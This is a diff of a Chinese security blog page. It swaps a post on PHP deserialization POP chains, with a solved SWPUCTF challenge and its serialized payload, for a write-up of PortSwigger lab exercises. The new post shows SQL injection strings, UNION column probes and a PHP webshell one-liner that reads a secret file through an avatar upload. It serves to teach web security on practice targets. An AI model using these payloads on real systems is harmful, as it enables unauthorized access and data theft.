@@ -9,7 +9,7 @@
   
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
   <title>
-    pop链构造 | Cl1ck-t0&#39;s blog
+    burp靶场漏洞实战 | Cl1ck-t0&#39;s blog
   </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
@@ -17,18 +17,18 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="pop链构造 在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包">
+    <meta name="description" content="burp靶场漏洞实战wp 之前一直在做各种题库中的题目，偶然得知burp靶场的题目不错，故作次wp，将持续跟进解题进度  一、sql注入  1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞 开头一个个看过去，没什么特别的。仔细看发现在Refine your search: 下面点进去url会变为 1https:&#x2F;&#x2F;0ade00b5041780e7808e120800720083.web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pop链构造">
-<meta property="og:url" content="https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/index.html">
+<meta property="og:title" content="burp靶场漏洞实战">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/index.html">
 <meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
-<meta property="og:description" content="pop链构造 在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包">
+<meta property="og:description" content="burp靶场漏洞实战wp 之前一直在做各种题库中的题目，偶然得知burp靶场的题目不错，故作次wp，将持续跟进解题进度  一、sql注入  1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞 开头一个个看过去，没什么特别的。仔细看发现在Refine your search: 下面点进去url会变为 1https:&#x2F;&#x2F;0ade00b5041780e7808e120800720083.web">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2026-02-19T08:41:25.000Z">
-<meta property="article:modified_time" content="2026-02-19T13:36:54.323Z">
+<meta property="article:published_time" content="2026-03-31T14:06:57.000Z">
+<meta property="article:modified_time" content="2026-03-31T15:29:15.556Z">
 <meta property="article:author" content="Cl1ck-t0">
+<meta property="article:tag" content="burp靶场">
 <meta property="article:tag" content="web">
-<meta property="article:tag" content="web漏洞">
 <meta name="twitter:card" content="summary">
     <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
     <link rel="shortcut icon" href="/images/favicon.ico">
@@ -122,11 +122,11 @@
 <header id="header" aria-label="Site header">
         <picture>
         </picture>
-          <img  fetchpriority="high" src="/images/banner.webp" alt="pop链构造">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="burp靶场漏洞实战">
   <div id="header-outer">
     <div id="header-title">
           <span id="logo">
-            <h1 data-aos="slide-up">pop链构造</h1>
+            <h1 data-aos="slide-up">burp靶场漏洞实战</h1>
           </span>
         <h2 id="subtitle-wrap" data-aos="slide-down">
         </h2>
@@ -157,7 +157,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.</span> <span class="toc-text"> pop链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#egswpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpop"><span class="toc-number">1.1.</span> <span class="toc-text"> eg.[SWPUCTF 2021 新生赛]pop</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98wp"><span class="toc-number">1.</span> <span class="toc-text"> burp靶场漏洞实战wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8Cwhere%E6%9D%A1%E6%AC%BE%E4%B8%AD%E5%85%81%E8%AE%B8%E6%A3%80%E7%B4%A2%E9%9A%90%E8%97%8F%E6%95%B0%E6%8D%AE%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%AE%9E%E9%AA%8C%E5%85%81%E8%AE%B8%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.实验：允许登录绕过的SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%AE%9E%E9%AA%8Csql%E6%B3%A8%E5%85%A5union%E6%94%BB%E5%87%BB%E7%A1%AE%E5%AE%9A%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.实验：SQL注入UNION攻击，确定查询返回的列数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%80%9A%E8%BF%87%E7%BD%91%E9%A1%B5%E5%A3%B3%E4%B8%8A%E4%BC%A0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.实验室：通过网页壳上传远程代码执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、</span></a></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -218,13 +218,13 @@
   </div>
 </aside>
 
-          <section id="main" aria-label="Main content"><article id="post-pop链构造" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main" aria-label="Main content"><article id="post-burp靶场漏洞实战" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
-    <time datetime="2026-02-19T08:41:25.000Z" itemprop="datePublished">2026-02-19</time>
-    <time style="display: none;" id="post-update-time">2026-02-19</time>
+    <time datetime="2026-03-31T14:06:57.000Z" itemprop="datePublished">2026-03-31</time>
+    <time style="display: none;" id="post-update-time">2026-03-31</time>
   </span>
 </div>
 
@@ -233,95 +233,73 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="pop链构造"><a class="markdownIt-Anchor" href="#pop链构造"></a> pop链构造</h1>
-<p>在PHP反序列化漏洞利用中，<strong>POP链（Property Oriented Programming Chain）</strong> 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：<strong>找到入口 → 确定尾巴 → 构建中间桥梁</strong>。</p>
-<p><strong>1. 明确入口与尾巴</strong></p>
-<ul>
-<li><strong>入口</strong>：常见为 <em>__wakeup()</em>、<em>__destruct()</em> 等在反序列化或对象销毁时自动调用的方法。</li>
-<li><strong>尾巴</strong>：包含危险函数的代码位置，如 <em>eval()</em>、<em>system()</em>、<em>file_put_contents()</em>、<em>include()</em> 等。</li>
-<li>先锁定尾巴，再反向寻找能触发它的调用链。</li>
-</ul>
-<p><strong>2. 利用魔术方法串联</strong> 常用魔术方法及触发条件：</p>
-<ul>
-<li>
-<p><em>__get()</em>：访问不可访问属性时触发。</p>
-</li>
-<li>
-<p><em>__set()</em>：给不可访问属性赋值时触发。</p>
-</li>
-<li>
-<p><em>__call()</em>：调用不存在方法时触发。</p>
-</li>
-<li>
-<p><em>__tostring()</em>：对象被当作字符串使用时触发。</p>
-</li>
-<li>
-<p><em>__invoke()</em>：对象被当作函数调用时触发。</p>
-<p>总之就是</p>
-<p>1.寻找可利用的魔术方法作为起点，也就是说链头特征是能够被输入内容的并且能被用户所控制的；</p>
-<ol start="2">
-<li>构建方法调用链，连接起点和终点；</li>
-<li>找到危险函数或操作作为终点，也就是说链尾特征是可以读取文件或者能够执行命令的；</li>
-<li>此时我们找到了链尾，正式开始构造pop链，从链尾反推到链头。</li>
-</ol>
-</li>
-</ul>
-<h3 id="egswpuctf-2021-新生赛pop"><a class="markdownIt-Anchor" href="#egswpuctf-2021-新生赛pop"></a> eg.[SWPUCTF 2021 新生赛]pop</h3>
-<p>代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line">    </span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>我们来进行简单分析：</p>
-<p>1.对于w44m类;</p>
-<p>如果变量前是protected，则会在变量名前加上<code>\x00*\x00</code>,</p>
-<p>若是private，则会在变量名前加上<code>\x00类名\x00</code>,输出时一般需要url编码;</p>
-<p>最终目标是调用Getflag()；</p>
-<p>2.对于w22m类；</p>
-<p>当类销毁时会输出<code>$this-&gt;w00m</code>；</p>
-<p>3.对于w33m类；</p>
-<p>当w33m类的对象被当做字符串使用时，触发__toString()方法；</p>
-<p>接着，我们尝试构造一下pop链，</p>
-<ul>
-<li>在w44m类中的Getflag作为尾部</li>
-<li>w33m类中有<code>$this-&gt;w00m-&gt;{$this-&gt;w22m}();</code>，因此我们需要给w00m一个w44m类，给w22m一个Getflag字符串</li>
-<li>而如何调用w33m类中的__toString()方法呢，我们看到w22m类中有<code>echo $this-&gt;w00m;</code>，需要给w00m一个w33m类即可</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w22m::__destruct()-&gt;w33m::__toString()-&gt;w44m::Getflag()</span><br></pre></td></tr></table></figure>
-<p>接着，我们再尝试构造payload：</p>
-<p>1、首先复制源码到编辑器中<br />
-将不需要的部分注释掉(和赋值无关的都注释掉)</p>
-<p>以下是删除注释后的剩余部分：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>2、添加pop链和序列化代码<br />
-根据前面我们的分析，从pop链的链尾开始赋值<br />
-私有和保护属性，采用内部赋值；</p>
-<p>对象赋值采用外部赋值：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$a=new w44m();// 创建w44m对象</span><br><span class="line">// 这里$a的属性还没有赋值，保持默认值</span><br><span class="line"></span><br><span class="line">$b=new w33m();</span><br><span class="line">$b-&gt;w00m=$a;//外部赋值：给public属性$w00m赋值</span><br><span class="line">$b-&gt;w22m=Getflag;//外部赋值：给public属性$w22m赋值</span><br><span class="line"></span><br><span class="line">$t=new w22m();</span><br><span class="line">$t-&gt;w00m=$b;</span><br><span class="line">echo serialize($t);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo urlencode(serialize($t));</span><br></pre></td></tr></table></figure>
-<p>构造得：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;\00w44m\00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;\00*\00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>URL编码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
-<p>然后得到flag。</p>
+        <h1 id="burp靶场漏洞实战wp"><a class="markdownIt-Anchor" href="#burp靶场漏洞实战wp"></a> burp靶场漏洞实战wp</h1>
+<p>之前一直在做各种题库中的题目，偶然得知burp靶场的题目不错，故作次wp，将持续跟进解题进度</p>
+<h2 id="一-sql注入"><a class="markdownIt-Anchor" href="#一-sql注入"></a> 一、sql注入</h2>
+<h3 id="1实验where条款中允许检索隐藏数据的sql注入漏洞"><a class="markdownIt-Anchor" href="#1实验where条款中允许检索隐藏数据的sql注入漏洞"></a> 1.实验：WHERE条款中允许检索隐藏数据的SQL注入漏洞</h3>
+<p>开头一个个看过去，没什么特别的。仔细看发现在<strong>Refine your search:</strong></p>
+<p>下面点进去url会变为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0ade00b5041780e7808e120800720083.web-security-academy.net/filter?category=Tech+gifts</span><br></pre></td></tr></table></figure>
+<p>看起来存在SQL注入。</p>
+<p>改成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0ade00b5041780e7808e120800720083.web-security-academy.net/filter?category=1&#x27; or 1=1--+</span><br></pre></td></tr></table></figure>
+<p>直接过了emmmmmm</p>
+<h3 id="2实验允许登录绕过的sql注入漏洞"><a class="markdownIt-Anchor" href="#2实验允许登录绕过的sql注入漏洞"></a> 2.实验：允许登录绕过的SQL注入漏洞</h3>
+<p>题目描述：该实验室的登录功能中存在SQL注入漏洞。</p>
+<p>要解决实验室问题，可以执行SQL注入攻击，以用户身份登录应用。<code>administrator</code></p>
+<p>直接万能语句1’ or 1=1–+ 秒了</p>
+<h3 id="3实验sql注入union攻击确定查询返回的列数"><a class="markdownIt-Anchor" href="#3实验sql注入union攻击确定查询返回的列数"></a> 3.实验：SQL注入UNION攻击，确定查询返回的列数</h3>
+<p>题目看出来是联合注入，</p>
+<p>这里已经很熟悉了，直接非常顺利</p>
+<p>1’ order by 3–+通过</p>
+<p>1’ order by 4–+报错，知道三列</p>
+<p>于是写payload，这里有一个问题当时错了：</p>
+<p>我最开始写的payload是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a9000cf04defb8b808a26d400ac0024.web-security-academy.net/filter?category=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+<p>页面报错，当时不知道为什么啊，后来查阅资料才知道：因为 <code>UNION</code> 要求类型兼容。如果第一列是整数，你输入 <code>'1'</code> 可能会报错；而 <code>NULL</code> 可以自适应任何类型。所以这里用1,2,3是错误的QAQ</p>
+<p>修改payload得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a9000cf04defb8b808a26d400ac0024.web-security-academy.net/filter?category=-1&#x27; union select NULL ,NULL ,NULL--+</span><br></pre></td></tr></table></figure>
+<p>通过</p>
+<h2 id="二-文件上传漏洞"><a class="markdownIt-Anchor" href="#二-文件上传漏洞"></a> 二、文件上传漏洞</h2>
+<h3 id="1实验室通过网页壳上传远程代码执行"><a class="markdownIt-Anchor" href="#1实验室通过网页壳上传远程代码执行"></a> 1.实验室：通过网页壳上传远程代码执行</h3>
+<p>题目描述：</p>
+<p>该实验室包含一个易受攻击的图像上传功能。它不会在用户上传的文件存储到服务器文件系统前进行任何验证。</p>
+<p>要解决实验问题，上传一个基础的PHP网页壳，并用它导出文件内容。请通过实验室横幅中的按钮提交此秘密。<code>/home/carlos/secret</code></p>
+<p>您可以使用以下凭证登录您自己的账户：<code>wiener:peter</code></p>
+<p>ps：骗你的，刚开始我甚至不知道这是题目描述（）</p>
+<p>打开来就开始找上传点，然后在评论区找到了上传头像的位置，出于以往经验，我直接尝试上传，却得到missing parameter，多次尝试无果后我转变方向，发现没有login（），这才知道wiener:peter原来是题目里的（）气笑了说是</p>
+<p>题目提示：如果你能成功上传网页外壳，你实际上就完全控制了服务器。这意味着你可以读写任意文件，窃取敏感数据，甚至利用服务器来针对内部基础设施和网络外其他服务器发动攻击。例如，以下PHP一行代码可用于从服务器文件系统读取任意文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo file_get_contents(&#x27;/path/to/target/file&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>上传后，发送对该恶意文件的请求将在响应中返回目标文件的内容。</p>
+<p>然后就写一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo file_get_contents(&#x27;/home/carlos/secret&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>上传成功后，查看上传路径，木马便会自动执行，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /files/avatars/1.php HTTP/2</span><br></pre></td></tr></table></figure>
+<p>得到目标：</p>
+<p>Rnh4NwyW1Gl2Ko3yWlVT2eFgyKRH9Hcd</p>
+<h2 id="三"><a class="markdownIt-Anchor" href="#三"></a> 三、</h2>
 
     </div>
     <footer class="article-footer">
         <blockquote class="article-copyright">
     <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
-    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/">https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/</a></p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/">https://cl1ck-t0.github.io/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/</a></p>
     
-    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-02-19 16:41:25</p>
-    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-02-19 21:36:54</p>
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-03-31 22:06:57</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-03-31 23:29:15</p>
     <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
     <span class="icon-creative-commons article-copyright-bg"></span>
   </blockquote>
         <div class="share-wrapper">
-    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F02%2F19%2Fpop%25E9%2593%25BE%25E6%259E%2584%25E9%2580%25A0%2F&amp;appkey=&amp;title=pop%E9%93%BE%E6%9E%84%E9%80%A0&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="pop链构造">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F03%2F31%2Fburp%25E9%259D%25B6%25E5%259C%25BA%25E6%25BC%258F%25E6%25B4%259E%25E5%25AE%259E%25E6%2588%2598%2F&amp;appkey=&amp;title=burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="burp靶场漏洞实战">
       <div class="share-icon icon icon-weibo">
       </div>
     </a>
-    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=pop%E9%93%BE%E6%9E%84%E9%80%A0&amp;desc=pop%E9%93%BE%E6%9E%84%E9%80%A0&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="pop链构造">
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98&amp;desc=burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="burp靶场漏洞实战">
       <div class="share-icon icon icon-qq">
       </div>
     </a>
-    <a href="javascript:;"  title="pop链构造">
+    <a href="javascript:;"  title="burp靶场漏洞实战">
       <div class="share-icon icon icon-weixin">
           <div id="share-weixin">
             <div class="share-weixin-dom">
@@ -344,25 +322,17 @@
     </a>
 </div>
       
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag" title="web漏洞">web漏洞</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/burp%E9%9D%B6%E5%9C%BA/" rel="tag" title="burp靶场">burp靶场</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li></ul>
 
     </footer>
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
-      <div class="article-nav-link-wrap left">
-            <img data-src="/covers/sangonomiya-kokomi-genshin-impact-anime-girl-5k-3840x2160-7457.jpg" data-sizes="auto" alt="CRT" class="lazyload">
-        <a href="/2026/02/24/CRT/" aria-label="Prev: CRT" title="Prev: CRT"></a>
-        <div class="article-nav-caption">Prev</div>
-        <h3 class="article-nav-title">
-            CRT
-        </h3>
-      </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/castorice-purple-3840x2160-22219.jpg" data-sizes="auto" alt="RCE漏洞原理及利用" class="lazyload">
-      <a href="/2026/02/15/RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" aria-label="Next: RCE漏洞原理及利用"  title="Next: RCE漏洞原理及利用"></a>
+          <img data-src="/covers/a313a5b13f55b09555bfaa524b212f13.jpg" data-sizes="auto" alt="SSTI注入" class="lazyload">
+      <a href="/2026/03/13/SSTI%E6%B3%A8%E5%85%A5/" aria-label="Next: SSTI注入"  title="Next: SSTI注入"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
-          RCE漏洞原理及利用
+          SSTI注入
       </h3>
     </div>
   </nav>
@@ -432,7 +402,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
